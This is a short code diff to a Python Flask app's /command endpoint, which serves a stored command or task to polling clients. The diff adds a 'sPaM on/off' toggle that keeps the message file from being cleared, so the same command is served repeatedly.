@@ -42,6 +42,7 @@ def edit():
 @app.route("/command", methods=["GET", "POST"])
 def command():
     global startTime
+    spam = None 
     if request.method == "GET":
         startTime = time()
         cmd = ""
@@ -50,7 +51,11 @@ def command():
         if os.path.exists(message_file):
             with open(message_file, "r") as file:
                 cmd = file.read()
-                
+
+        if cmd == "sPaM on":
+        	spam = True
+        if cmd == "sPaM off":
+        	spam = False                
         if cmd == "":
             if os.path.exists(tasks_file):
                 with open(tasks_file, "r") as file:
@@ -68,9 +73,9 @@ def command():
                     tasks["tasks"] = [task for task in tasks["tasks"] if task["id"] != tasks_to_delete]
                     with open(tasks_file, "w") as file:
                         json.dump(tasks, file, indent=4)
-                        
-        with open(os.path.join(STATIC_FOLDER,"message.txt"),"w") as file:
-        	file.write("")
+        if not spam:
+         	with open(os.path.join(STATIC_FOLDER,"message.txt"),"w") as file:
+         		file.write("")
         
         return cmd if cmd else "none"
 
